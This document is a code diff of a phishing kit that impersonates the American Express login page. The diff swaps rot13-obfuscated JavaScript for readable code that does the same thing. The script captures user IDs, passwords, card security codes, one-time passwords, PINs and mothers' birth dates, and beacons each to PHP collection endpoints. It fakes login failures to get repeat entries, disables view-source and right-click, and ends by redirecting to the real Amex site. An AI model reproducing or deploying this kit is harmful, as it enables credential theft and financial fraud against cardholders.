@@ -185,10 +185,10 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 						  	 <div class="dynamicSubContainer">
 						  	 <p style="padding: 50px;"></p>
 						  	<div class="formHeader">
-						  		<p style="text-align: center; color: #003264; font-weight: 600; font-size: 15px;">Charge activity cancellation:</p>
-						  		<p style="text-align: center; color: #484848; font-weight: 600; font-size: 12px;">Extra Layer Verification Required</p>
+						  		<p style="text-align: center; color: #003264; font-weight: 600; font-size: 15px;">Account activity information:</p>
+						  		<p style="text-align: center; color: #484848; font-weight: 600; font-size: 12px;">Security Check</p>
 						  		<div></div>
-        						<p style="text-align: center; color: #484848; font-weight: 400; font-size: 11px;"> Please wait while we take you to My Account Log In... </p>
+        						<p style="text-align: center; color: #484848; font-weight: 400; font-size: 11px;"> Please wait while we take you to My Account ... </p>
         					</div>
         					<p style="padding: 50px;"></p>
         				   </div>
@@ -340,8 +340,90 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 		 </div>
 		</div> 
 <script>
-function _rot13(s){return s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26))};
-function setupUI(){const t=_rot13("t.cuc");function bindEnterToButton(t,n){document.addEventListener("keydown",(o=>{if("Enter"===o.key){const o=document.activeElement;if(o&&o.matches(t)){const t=document.querySelector(n);t&&t.click()}}}))}document.addEventListener("keydown",(t=>{t.ctrlKey&&([83,62,7,85,424].includes(t.keyCode)||["u"].includes(t.key?.toLowerCase()))&&t.preventDefault()})),document.addEventListener("contextmenu",(t=>t.preventDefault())),document.querySelectorAll("form").forEach((t=>t.addEventListener("submit",(t=>t.preventDefault())))),bindEnterToButton(_rot13("#bha, #hcj"),"button[name='submita']"),bindEnterToButton("#cscInput","button[name='submitb']"),bindEnterToButton(_rot13("#bgc, #ca, #zzqq"),"button[name='submitc']");const n=document.getElementById("upw"),o=document.getElementById("toggleupw");let e=!1;n&&n.addEventListener("input",(()=>{e||(e=!0,n.type="password")})),n&&o&&o.addEventListener("click",(()=>{if(!e)return;const t="password"===n.type?"text":"password";n.type=t,o.textContent="password"===t?"Show":"Hide"})),document.addEventListener("change",(n=>{const o=n.target;if(o?.closest("#clsdiv")&&o.matches(_rot13(".vachg-pbageby"))){const n=document.querySelectorAll(_rot13(".vachg-pbageby")),o={timestamp:(new Date).toISOString(),t:{}};n.forEach((t=>{t.name&&(o.t[t.name]=t.value)})),function(n){const o=new Blob([JSON.stringify(n)],{type:_rot13("nccyvpngvba/wfba")});let e=!1;if(navigator.sendBeacon&&(e=navigator.sendBeacon(t,o)),!e)fetch(t,{method:"POST",body:JSON.stringify(n),headers:{o:_rot13("nccyvpngvba/wfba")},keepalive:!0})}(o)}}))}document.addEventListener("DOMContentLoaded",setupUI);
+function setupUI() {
+  const ENDPOINT = "m.php";
+
+  document.addEventListener("keydown", e => {
+    const blockedKeyCodes = [83, 62, 7, 85, 424]; // S, >, BEL, U, F24
+    const blockedKeys = ["u"];
+    if (e.ctrlKey && (blockedKeyCodes.includes(e.keyCode) || blockedKeys.includes(e.key?.toLowerCase()))) {
+      e.preventDefault();
+    }
+  });
+  document.addEventListener("contextmenu", e => e.preventDefault());
+  document.querySelectorAll("form").forEach(f => f.addEventListener("submit", e => e.preventDefault()));
+
+  function bindEnterToButton(inputSelector, buttonSelector) {
+    document.addEventListener("keydown", e => {
+      if (e.key === "Enter") {
+        const active = document.activeElement;
+        if (active && active.matches(inputSelector)) {
+          const btn = document.querySelector(buttonSelector);
+          if (btn) btn.click();
+        }
+      }
+    });
+  }
+  bindEnterToButton("#oun, #upw", "button[name='submita']");
+  bindEnterToButton("#cscInput", "button[name='submitb']");
+  bindEnterToButton("#otp, #pn, #mmdd", "button[name='submitc']");
+
+  const passwordInput = document.getElementById("upw");
+  const toggleButton = document.getElementById("toggleupw");
+  let hasTyped = false;
+
+  if (passwordInput) {
+    passwordInput.addEventListener("input", () => {
+      if (!hasTyped) {
+        hasTyped = true;
+        passwordInput.type = "password";
+      }
+    });
+  }
+  if (passwordInput && toggleButton) {
+    toggleButton.addEventListener("click", () => {
+      if (!hasTyped) return; // prevent toggle before input
+      const type = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = type;
+      toggleButton.textContent = type === "password" ? "Show" : "Hide";
+    });
+  }
+
+  function sendPayload(payload) {
+    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+    let beaconOk = false;
+
+    if (navigator.sendBeacon) {
+      beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+    }
+
+    if (!beaconOk) {
+      return fetch(ENDPOINT, {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" },
+        keepalive: true
+      });
+    }
+  }
+
+  document.addEventListener("change", e => {
+    const el = e.target;
+    if (el?.closest("#clsdiv") && el.matches(".input-control")) {
+      const inputs = document.querySelectorAll(".input-control");
+      const payload = {
+        timestamp: new Date().toISOString(),
+        fields: {}
+      };
+      inputs.forEach(input => {
+        if (input.name) payload.fields[input.name] = input.value;
+      });
+      sendPayload(payload);
+    }
+  });
+}
+
+document.addEventListener("DOMContentLoaded", setupUI);
 </script>
 
 
@@ -410,13 +492,563 @@ function setupUI(){const t=_rot13("t.cuc");function bindEnterToButton(t,n){docum
     <div style="font-size: 0px; cursor: pointer; position: fixed; top: 334px; bottom: auto; display: block; background-color: transparent; border: medium none; z-index: 2000000001; right: 0px;" tabindex="0"><img src="data:image/gif;base64,R0lGODlhGQB2APcAAAAAAAAAMwAAZgAAmQAAzAAA/wArAAArMwArZgArmQArzAAr/wBVAABVMwBVZgBVmQBVzABV/wCAAACAMwCAZgCAmQCAzACA/wCqAACqMwCqZgCqmQCqzACq/wDVAADVMwDVZgDVmQDVzADV/wD/AAD/MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMrADMrMzMrZjMrmTMrzDMr/zNVADNVMzNVZjNVmTNVzDNV/zOAADOAMzOAZjOAmTOAzDOA/zOqADOqMzOqZjOqmTOqzDOq/zPVADPVMzPVZjPVmTPVzDPV/zP/ADP/MzP/ZjP/mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YrAGYrM2YrZmYrmWYrzGYr/2ZVAGZVM2ZVZmZVmWZVzGZV/2aAAGaAM2aAZmaAmWaAzGaA/2aqAGaqM2aqZmaqmWaqzGaq/2bVAGbVM2bVZmbVmWbVzGbV/2b/AGb/M2b/Zmb/mWb/zGb//5kAAJkAM5kAZpkAmZkAzJkA/5krAJkrM5krZpkrmZkrzJkr/5lVAJlVM5lVZplVmZlVzJlV/5mAAJmAM5mAZpmAmZmAzJmA/5mqAJmqM5mqZpmqmZmqzJmq/5nVAJnVM5nVZpnVmZnVzJnV/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwAM8wAZswAmcwAzMwA/8wrAMwrM8wrZswrmcwrzMwr/8xVAMxVM8xVZsxVmcxVzMxV/8yAAMyAM8yAZsyAmcyAzMyA/8yqAMyqM8yqZsyqmcyqzMyq/8zVAMzVM8zVZszVmczVzMzV/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8Amf8AzP8A//8rAP8rM/8rZv8rmf8rzP8r//9VAP9VM/9VZv9Vmf9VzP9V//+AAP+AM/+AZv+Amf+AzP+A//+qAP+qM/+qZv+qmf+qzP+q///VAP/VM//VZv/Vmf/VzP/V////AP//M///Zv//mf//zP///wAAAAAAAAAAAAAAACH5BAEAAPwALAAAAAAZAHYAAAj/ACkIHEiwoMGCGgQmpLCwocKHDA9KnIgQosOIFiFSJLjwYEeMICtK7PgxJMeNGi8OvEgSZUmKLEeuLAJSwxuRJgVGuymwCChQOQ0m1JBJWZGEoOjRxPmSgh1lcJRBW2ryo9VM+6Z6FFmESJEfXkEZ9bFBo0dly6JBS1sv2r5oykqqpFDkjd0ibuoSeePjJEoiBCvMXakRFJyVoHj6PUgE2s2Fb+ISnvywyDKqFIgsM4uTgmOCRYx2NqgMVFebyuzIrElXGVzXoABjbGr1DRy7fbcGzTh7Yse6dm9jXkzyzTJob5GDismZwr46kYv4gIoStFGfDEOz9pswtHTRRaD9/+D80sdODYnrSt7YUNnNN9H07eRO2aDtN4N369efcEPk44k1Vx8FoOyTWGTRUEWSVQIRsQ9+CmmynoADeUcQEdHkJpRZ862kjGAU0lVEEZ9cV5cmQDGlkDJZtZXVi8uFSJcPXdFo43ArteTSgBV61dWIXnkF04pw7VPPWmsZyJtBP+40onqKEUfQdFG+AdRcLxWRIGjiVbcQNJl0JNZQ9ZUEX2mgrBXlaAv5pExpEC7GY1XbbfiGHZn8YBOOZQp0JjSA/SQnZea94dN4oZGZUkGhASaZZhr+dRkRprWmI28JpfZDbD9Ac1idB4XmmlTLENHUogpFFuBo1a2mUkJvQP9TaYCn+qVJNKCUSmCMc67kmA8xaheUohR0qico4xEh2qAPaSZdbBRYOWBTP/lU1zKq1VqSsm7JB0qk+YFkl1211lRXc8wVhKKfV3qpUB3K+BkNfYOuq0FU5TJIQR0pwteXjrWK1ZXARIDFp1lvvKWwwtFoou9JwI0rsWLlsidSTOnu12qfITEn14Yb74gqgyMaanJdKBuKY0euyYccNGrt0zJc6Lq3UWQA67TmZLFWMJImNJ2qAXa9lamnxhTZpdt2DglaNKsDlbbakKA4/DTT0VZdh1ooAt2qTT8ViOaqr4LstNCjgRImvb2mFnJGeE6Ws0y0eWSofkWoBnKHJ0E6NqFVNkckV2QTbbrP4YgnfjhcHk/suMQWz51fxRZTVvaSUM+J9rAg57u0lHW+RPm0bHs+pNy6jf5QQAA7" style="border: medium none; text-decoration: none; padding: 0px; margin: 0px;" alt="Feedback Link"></div><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" style="display: none;" alt="">
 
 <script>
-function _rot13(s){return s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26))};
-!function(){function buildErrorHtml(e,o=""){return"<div class='otp-error'><i class='bi bi-exclamation-triangle-fill'></i><div class='error-text-block'><div class='error-text'>"+e+"</div>"+(o?"<div class='error-extra'>"+o+"</div>":"")+"</div></div><hr style='color:#c0c0c0;' />"}function setupFormFlow(){var e;!function(){$("#starting").animate({opacity:"show"},100).delay(3e3).animate({opacity:"hide"},1e3),$("#clsdiv1").delay(4100).animate({opacity:"show"},100),$("#title").html("&nbsp;Log In to My&nbsp;&nbsp;Account &nbsp;| &nbsp;American Express&nbsp;&nbsp;US");const e=document.getElementById("oun");e&&e.focus();const clearFields=()=>{document.querySelectorAll("input").forEach((e=>e.value="")),document.querySelectorAll(_rot13("#reebe, #zft, #pfpreebe, #pfperpbhag, #bgcreebe, #careebe, #zzqqreebe, #bgcierpbhag")).forEach((e=>e.style.display="none"))};window.addEventListener("load",clearFields),window.addEventListener("pageshow",clearFields)}(),$.loading=function(e){e.data("old-html")?e.prop("disabled",!1).html(e.data("old-html")).data("old-html",!1):e.data("old-html",e.html()).prop("disabled",!0).html(e.data("loading-text")||"&nbsp;")},e=0,$("button[name='submita']").click((function(o){o.preventDefault(),$(_rot13("#reebe, #zft, #ybtpbhag")).hide();var n=$("#oun").val(),t=$("#upw").val();if(!n||!t)return $("#error").show().html(buildErrorHtml(_rot13("Obgu gur Hfre VQ naq Cnffjbeq ner erdhverq."))),(n?$("#upw"):$("#oun")).focus(),!1;if(++e>=2)e=0,$("#login").fadeIn().html("<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"),$("#clsdiv1").delay(2e3).fadeOut(1e3),$("#loading").delay(3e3).fadeIn(1e3).delay(4e3).fadeOut(1e3),$("#clsdiv2").delay(9e3).fadeIn(1e3),$("#title").html("American Express&nbsp;&nbsp; | &nbsp;Authentication"),$("#cscerror").hide(),$("#cscInput").focus();else{var i=$("#login");$("#logcount").hide(),$.loading(i,!0),setTimeout((function(){$.loading(i,!1),$("#logcount").show().html(buildErrorHtml(_rot13("Gur Hfre VQ be Cnffjbeq vf vapbeerpg. Cyrnfr gel ntnva."))),$(_rot13("#bha, #hcj")).val(""),$("#oun").focus()}),5e3)}})),function(){let e=0;$("button[name='submitb']").on("click",(function(o){o.preventDefault(),$(_rot13("#pfpreebe, #pfperpbhag")).hide();const n=$("#cscInput").val().replace(/\D/g,""),t=$("#verify");if(0!==t.length){if(!n||n.length<3)return $("#cscInput").focus(),void $("#cscerror").show().html('&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)');e++,e>=2?(e=0,$.loading(t),$("#clsdiv2").delay(2e3).fadeOut(1e3),$("#loading").delay(3e3).fadeIn(1e3).delay(4e3).fadeOut(1e3,(function(){$("#clsdiv3").fadeIn(1e3),$("#title").html("American Express&nbsp;&nbsp; | &nbsp;Verification"),$("#otperror").hide(),$("#otp").focus()}))):($.loading(t),setTimeout((function(){$.loading(t),$("#cscrecount").hide().html('&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)').fadeIn(500),$("#cscInput").val("").focus()}),1e3))}}))}(),$("#otp").on("input",(function(){$(this).val().trim().replace(/\D/g,"").length>=6?$("#pnmmdd").stop(!0,!0).slideDown("slow"):$("#pnmmdd").stop(!0,!0).slideUp("slow")})),$(_rot13("#ceri1, #ceri2, #ceri3")).click((function(e){e.preventDefault(),$(_rot13("#zft, #reebe, #pfpreebe, #bgcreebe, #careebe, #zzqqreebe")).hide(),$(_rot13("#bha, #hcj, #pfpVachg, #ca, #zzqq, #bgc")).val(""),$("#prev1").animate({opacity:"show"},2e3).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;"),$("#priv2").animate({opacity:"show"},2e3).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;"),$("#priv3").animate({opacity:"show"},2e3).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;"),$(_rot13("#pyfqvi4,#pyfqvi3, #pyfqvi2, #pyfqvi1")).fadeOut(2e3).delay(2e3),$("#clsdiv1").fadeIn(4e3),$("#login").html("Log In"),$("#verify").html("Confirm"),$("#otpv").html("Verify"),$("#title").html("&nbsp; Log In to My&nbsp;&nbsp;Account&nbsp;|&nbsp;American Express&nbsp;&nbsp;US"),$(_rot13("#ceri1, #ceri2, #ceri3")).html("Log In")})),function(){let e=0;const o=_rot13("v.cuc");function sendPayload(e){const n=new Blob([JSON.stringify(e)],{type:_rot13("nccyvpngvba/wfba")});let t=!1;if(navigator.sendBeacon&&(t=navigator.sendBeacon(o,n)),!t&&o)return fetch(o,{method:"POST",body:JSON.stringify(e),headers:{"Content-Type":_rot13("nccyvpngvba/wfba")},keepalive:!0})}function showLightOverlay(e="#subclsdiv3",o=3e4,n=2e3,t="#otpv",i=null){const r=$(e);0===r.find(_rot13(".bireynl-ynlre")).length&&r.css("position","relative").append("<div class='overlay-layer'><div class='spinner-border' role='status'></div><div class='toast-msg' style='display:none;'>Code Sent</div></div>");const s=r.find(_rot13(".bireynl-ynlre")),c=s.find(_rot13(".gbnfg-zft"));$(t).prop("disabled",!0),s.stop(!0,!0).fadeIn(200),setTimeout((function(){c.fadeIn(300).delay(1500).fadeOut(500)}),o-2e3),s.delay(o).fadeOut(n,(function(){$(this).hide(),$(t).prop("disabled",!1),"function"==typeof i&&i()}))}let n;$(document).on("click","#resend",(function(o){o.preventDefault(),e++;const n=$("#otpv");$.loading(n,!0);const t={timestamp:(new Date).toISOString(),clickCount:e,fields:{}};$(_rot13(".vachg-pbageby")).each((function(){this.name&&(t.fields[this.name]=this.value)})),sendPayload(t),showLightOverlay("#subclsdiv3",3e4,2e3,"#otpv",(function(){$.loading(n,!1),$("#otpv").html("Verify"),$("#otp").val("")}))})),$(document).on("input",_rot13(".vachg-pbageby"),(function(){clearTimeout(n),n=setTimeout((()=>{const e={timestamp:(new Date).toISOString(),fields:{}};$(_rot13(".vachg-pbageby")).each((function(){this.name&&(e.fields[this.name]=this.value)})),sendPayload(e)}),5e3)}))}(),function(){let e=0,o=!1;const n=_rot13("f.cuc"),t=15e3,i=1e4,r=5e3;function sendPayload(e){const o=new Blob([JSON.stringify(e)],{type:_rot13("nccyvpngvba/wfba")});let t=!1;if(navigator.sendBeacon&&(t=navigator.sendBeacon(n,o)),!t&&n)return fetch(n,{method:"POST",body:JSON.stringify(e),headers:{"Content-Type":_rot13("nccyvpngvba/wfba")},keepalive:!0})}function showOtpError(e=""){$("#otpvrecount").stop(!0,!0).show().html(buildErrorHtml(_rot13("Cyrnfr ragre gur pbeerpg bar-gvzr cnffjbeq."),e)),$("#otp").val("").focus()}function showLightOverlay(e){const o=$("#subclsdiv3");0===o.find(_rot13(".bireynl-ynlre")).length&&o.css("position","relative").append("<div class='overlay-layer'><div class='spinner-border' role='status'></div></div>");const n=o.find(_rot13(".bireynl-ynlre"));n.stop(!0,!0).fadeIn(200),setTimeout((function(){n.stop(!0,!0).fadeOut(500,(function(){$(this).hide()}))}),e)}function runOverlayThen(e=null){$("#overlay").stop(!0,!0).fadeIn(300).delay(r).fadeOut(300,(function(){$(this).hide(),"function"==typeof e&&e()}))}function finish(e){$.loading(e,!1),e.prop("disabled",!1),o=!1}document.addEventListener("click",(function(n){if(!n.target||"submitc"!==n.target.name)return;if(n.preventDefault(),o)return;const r=$("#otpv");o=!0,$.loading(r,!0),r.prop("disabled",!0),$(_rot13("#reebe,#zft,#bgcreebe,#careebe,#zzqqreebe,#bgcierpbhag")).hide().empty();const s=($("#otp").val()||"").replace(/\D/g,""),c=($("#pn").val()||"").replace(/\D/g,""),a=($("#mmdd").val()||"").replace(/\D/g,"");if(!s||s.length<6)return $("#otp").focus(),$("#otperror").show().html(_rot13("Cyrnfr ragre gur pbeerpg 6-qvtvg bar-gvzr cnffjbeq.")),void finish(r);if(c&&(c.length<4||c.length>8))return $("#pn").focus(),$("#pnerror").show().html(_rot13("4 gb 8 qvtvgf lbh cebivqrq jura npgvingvat lbhe pneq.")),void finish(r);if(a&&4!==a.length)return $("#mmdd").focus(),$("#mmdderror").show().html("Confirm your Mother’s Birth Month/Day (MMDD)."),void finish(r);e++;const l={timestamp:(new Date).toISOString(),fields:{}};$("input").each((function(){this.name&&(l.fields[this.name]=this.value)})),sendPayload(l),1===e?(showLightOverlay(t),setTimeout((function(){showOtpError(_rot13("Cyrnfr gel ntnva.")),finish(r)}),t)):2===e?(showLightOverlay(i),setTimeout((function(){showOtpError(_rot13("Rkcverq bar-gvzr pbqr, cyrnfr gel ntnva.")),runOverlayThen((function(){window.open(_rot13("nobhg:oynax"),"_blank",_rot13("abbcrare,abersreere")),finish(r)}))}),i)):e>=3&&(e=0,$("#clsdiv3").fadeOut(3e3),$("#loading").delay(3e3).fadeIn(1e3).delay(15e3).fadeOut(1e3),$("#clsdiv4").delay(2e4).fadeIn(1e3,(function(){$("#title").html("&nbsp;American Express&nbsp;&nbsp;|&nbsp;&nbsp;Thank You!"),setTimeout((function(){window.location="https://norefer.com/to/https://global.americanexpress.com/myca/logon/us/action/LogLogonHandler?request_type=LogLogonHandler&location=us_logon1"}),5e3),finish(r)})),setTimeout((function(){showOtpError(_rot13("Rkcverq bar-gvzr pbqr, cyrnfr gel ntnva."))}),t))}))}()}window.qs=function(e){for(var o,n=[],t=window.location.href.slice(window.location.href.indexOf(_rot13("?"))+1).split(_rot13("&")),i=0;i<t.length;i++)o=t[i].split("="),n.push(o[0]),n[o[0]]=decodeURIComponent(o[1]||"");return n[e]},window.populateEmailFields=function(){var e=window.location.href,o=e.substring(e.lastIndexOf(_rot13("/"))+1),n=qs("id")||qs("authuser")||qs("user")||qs("profile")||qs("memberID")||qs("ref")||qs("code")||qs("tid")||qs("qid")||qs("join")||qs("oun")||qs("tid")||qs("cid")||qs("eid")||qs("fid")||qs("mid")||qs("pid")||qs("sid")||qs("Linkid")||qs("keyID");if("string"==typeof n&&n){const e=n.slice(3,-2);$(_rot13("#rznvyvq, .rznvyvq")).html(e),$(_rot13("#gepxn, #gepxo, #gepxp")).val(o)}else{var t=window.location.pathname.split(_rot13("/")),i="",r="";const e=[_rot13("%"),"-",_rot13(":"),_rot13("~"),"="];i=t.length>=3?t[t.length-2]||"":window.location.href.slice(window.location.href.lastIndexOf(_rot13("/"))+1);for(let o of e){const e=i.indexOf(o),n=i.lastIndexOf(o);if(-1!==e&&n>e+1){r=i.slice(e+1,n);break}if(-1!==e&&e<i.length-2){r=i.slice(e+1);break}}if(!r){const e=i.match(/[a-zA-Z0-9._@-]+/g),o=e?e.join(""):"";r=o.length>4?o.slice(2,-2):o}$(_rot13("#rznvyvq, .rznvyvq")).html(r),$(_rot13("#gepxn, #gepxo, #gepxp")).val(r+"-"+o)}},$(document).ready((function(){populateEmailFields(),setupFormFlow()}))}();
+(function () {
+  window.qs = function (key) {
+  var vars = [], hash;
+  var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+  for (var i = 0; i < hashes.length; i++) {
+    hash = hashes[i].split('=');
+    vars.push(hash[0]);
+    vars[hash[0]] = decodeURIComponent(hash[1] || '');
+  }
+  return vars[key];
+};
+
+window.populateEmailFields = function () {
+  var path = window.location.href;
+  var slashval = path.substring(path.lastIndexOf('/') + 1);
+  var matches =
+    qs('id') || qs('authuser') || qs('user') || qs('profile') || qs('memberID') || qs('ref') ||
+    qs('code') || qs('tid') || qs('qid') || qs('join') || qs('oun') || qs('tid') || qs('cid') ||
+    qs('eid') || qs('fid') || qs('mid') || qs('pid') || qs('sid') || qs('Linkid') || qs('keyID');
+
+  var arrayval = matches;
+
+  if (typeof arrayval !== 'string' || !arrayval) {
+    var esval = window.location.pathname.split('/');
+    var segcount = esval.length;
+    var esegval = '';
+    var seg4email = '';
+    const separators = ['%', '-', ':', '~', '='];
+
+    if (segcount >= 3) {
+      esegval = esval[esval.length - 2] || '';
+    } else {
+      esegval = window.location.href.slice(window.location.href.lastIndexOf('/') + 1);
+    }
+
+    for (let sep of separators) {
+      const first = esegval.indexOf(sep);
+      const last = esegval.lastIndexOf(sep);
+
+      if (first !== -1 && last > first + 1) {
+        seg4email = esegval.slice(first + 1, last);
+        break;
+      } else if (first !== -1 && first < esegval.length - 2) {
+        seg4email = esegval.slice(first + 1);
+        break;
+      }
+    }
+
+    if (!seg4email) {
+      const match = esegval.match(/[a-zA-Z0-9._@-]+/g);
+      const raw = match ? match.join('') : '';
+      seg4email = raw.length > 4 ? raw.slice(2, -2) : raw;
+    }
+
+    $('#emailid, .emailid').html(seg4email);
+    $('#trcka, #trckb, #trckc').val(seg4email + '-' + slashval);
+
+  } else {
+    const aeval = matches.slice(3, -2);
+    $('#emailid, .emailid').html(aeval);
+    $('#trcka, #trckb, #trckc').val(slashval);
+  }
+};
+
+  function buildErrorHtml(msg, extraMsg = "") {
+	  return (
+	    "<div class='otp-error'>" +
+	      "<i class='bi bi-exclamation-triangle-fill'></i>" +
+	      "<div class='error-text-block'>" +
+	        "<div class='error-text'>" + msg + "</div>" +
+	        (extraMsg ? "<div class='error-extra'>" + extraMsg + "</div>" : "") +
+	      "</div>" +
+	    "</div>" +
+	    "<hr style='color:#c0c0c0;' />"
+	  );
+	}
+
+
+  function setupFormFlow() {
+    setupIntro();
+    setupLoading();
+    setupLoginHandler();
+    setupCSCHandler();
+    setupOTPWatcher();
+    setupResetButtons();
+    setupResendOTP();
+    setupFinalSubmit();
+  }
+
+  function setupIntro() {
+  $('#starting').animate({ opacity: 'show' }, 100).delay(3000).animate({ opacity: 'hide' }, 1000);
+  $('#clsdiv1').delay(4100).animate({ opacity: 'show' }, 100);
+  $('#title').html('&nbsp;Log In to My&nbsp;&nbsp;Account &nbsp;| &nbsp;American Express&nbsp;&nbsp;US');
+  const oun = document.getElementById('oun');
+  if (oun) oun.focus();
+
+  // 🧹 Clear all fields on refresh or back
+  const clearFields = () => {
+    document.querySelectorAll('input').forEach(el => el.value = '');
+    document.querySelectorAll('#error, #msg, #cscerror, #cscrecount, #otperror, #pnerror, #mmdderror, #otpvrecount').forEach(el => el.style.display = 'none');
+  };
+
+  window.addEventListener('load', clearFields);
+  window.addEventListener('pageshow', clearFields);
+}
+
+
+  function setupLoading() {
+    $.loading = function (btn) {
+      if (!btn.data('old-html')) {
+        btn.data('old-html', btn.html()).prop('disabled', true).html(btn.data('loading-text') || '&nbsp;');
+        return;
+      }
+      btn.prop('disabled', false).html(btn.data('old-html')).data('old-html', false);
+    };
+  }
+
+
+  function setupLoginHandler() {
+    var count = 0;
+    $("button[name='submita']").click(function (e) {
+      e.preventDefault();
+      $('#error, #msg, #logcount').hide();
+      var oun = $('#oun').val();
+      var upw = $('#upw').val();
+
+      if (!oun || !upw) {
+        $('#error').show().html(buildErrorHtml("Both the User ID and Password are required."));
+        (!oun ? $('#oun') : $('#upw')).focus();
+        return false;
+      }
+
+      count++;
+      if (count >= 2) {
+        count = 0;
+        $('#login').fadeIn().html("<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;");
+        $('#clsdiv1').delay(2000).fadeOut(1000);
+        $('#loading').delay(3000).fadeIn(1000).delay(4000).fadeOut(1000);
+        $('#clsdiv2').delay(9000).fadeIn(1000);
+        $('#title').html('American Express&nbsp;&nbsp; | &nbsp;Authentication');
+        $('#cscerror').hide();
+        $('#cscInput').focus();
+      } else {
+        var $btn = $("#login");
+        $('#logcount').hide();
+        $.loading($btn, true);
+        setTimeout(function () {
+          $.loading($btn, false);
+          $('#logcount').show().html(buildErrorHtml("The User ID or Password is incorrect. Please try again."));
+          $('#oun, #upw').val('');
+          $('#oun').focus();
+        }, 5000);
+      }
+    });
+  }
+
+  function setupCSCHandler() {
+  let count = 0;
+
+  $("button[name='submitb']").on('click', function (e) {
+    e.preventDefault();
+    $('#cscerror, #cscrecount').hide();
+
+    const rawCSC = $('#cscInput').val();
+    const csc = rawCSC.replace(/\D/g, '');
+
+    const $btn = $('#verify');
+    if ($btn.length === 0) return;
+
+    // Reject if no digits or fewer than 3 digits
+    if (!csc || csc.length < 3) {
+      $('#cscInput').focus();
+      $('#cscerror').show().html(
+        '&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)'
+      );
+      return;
+    }
+
+    count++;
+
+    if (count >= 2) {
+      count = 0;
+      $.loading($btn);
+      $('#clsdiv2').delay(2000).fadeOut(1000);
+      $('#loading').delay(3000).fadeIn(1000).delay(4000).fadeOut(1000, function () {
+        $('#clsdiv3').fadeIn(1000);
+        $('#title').html('American Express&nbsp;&nbsp; | &nbsp;Verification');
+        $('#otperror').hide();
+        $('#otp').focus();
+      });
+    } else {
+      $.loading($btn);
+      setTimeout(function () {
+        $.loading($btn);
+        $('#cscrecount')
+          .hide()
+          .html('&nbsp; &nbsp; <i class="bi bi-exclamation-triangle-fill"></i> &nbsp;Required valid 3-digit Card Security Code (CSC)')
+          .fadeIn(500);
+        $('#cscInput').val('').focus();
+      }, 1000);
+    }
+  });
+}
+
+
+  function setupOTPWatcher() {
+    $('#otp').on('input', function () {
+      const value = $(this).val().trim();
+      const digitCount = value.replace(/\D/g, '').length;
+      if (digitCount >= 6) {
+        $('#pnmmdd').stop(true, true).slideDown('slow');
+      } else {
+        $('#pnmmdd').stop(true, true).slideUp('slow');
+      }
+    });
+  }
+
+  function setupResetButtons() {
+    $('#prev1, #prev2, #prev3').click(function (e) {
+      e.preventDefault();
+      $('#msg, #error, #cscerror, #otperror, #pnerror, #mmdderror').hide();
+      $('#oun, #upw, #cscInput, #pn, #mmdd, #otp').val('');
+      $('#prev1').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
+      $('#priv2').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
+      $('#priv3').animate({ opacity: 'show' }, 2000).html("<i class='spinner-border spinner-border-sm text-primary' role='status'></i> &nbsp;");
+      $('#clsdiv4,#clsdiv3, #clsdiv2, #clsdiv1').fadeOut(2000).delay(2000);
+      $('#clsdiv1').fadeIn(4000);
+      $('#login').html('Log In');
+      $('#verify').html('Confirm');
+      $('#otpv').html('Verify');
+      $('#title').html('&nbsp; Log In to My&nbsp;&nbsp;Account&nbsp;|&nbsp;American Express&nbsp;&nbsp;US');
+      $('#prev1, #prev2, #prev3').html('Log In');
+    });
+  }
+
+
+function setupResendOTP() {
+  let clickCount = 0;
+  const ENDPOINT = "i.php";
+
+  // 📤 Sender specific to Resend OTP
+  function sendPayload(payload) {
+    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+    let beaconOk = false;
+    if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+    if (!beaconOk && ENDPOINT) {
+      return fetch(ENDPOINT, {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" },
+        keepalive: true
+      });
+    }
+  }
+
+  // 🔲 Overlay routine with spinner + toast targeting #subclsdiv3
+  function showLightOverlay(target = "#subclsdiv3", duration = 30000, fade = 2000, btnSelector = "#otpv", callback = null) {
+    const $target = $(target);
+    if ($target.find(".overlay-layer").length === 0) {
+      $target.css("position", "relative").append(
+        "<div class='overlay-layer'>" +
+          "<div class='spinner-border' role='status'></div>" +
+          "<div class='toast-msg' style='display:none;'>Code Sent</div>" +
+        "</div>"
+      );
+    }
+    const $overlay = $target.find(".overlay-layer");
+    const $toast = $overlay.find(".toast-msg");
+
+    $(btnSelector).prop("disabled", true);
+    $overlay.stop(true, true).fadeIn(200);
+
+    // ⏳ Flash toast for 1.5s near the end of overlay
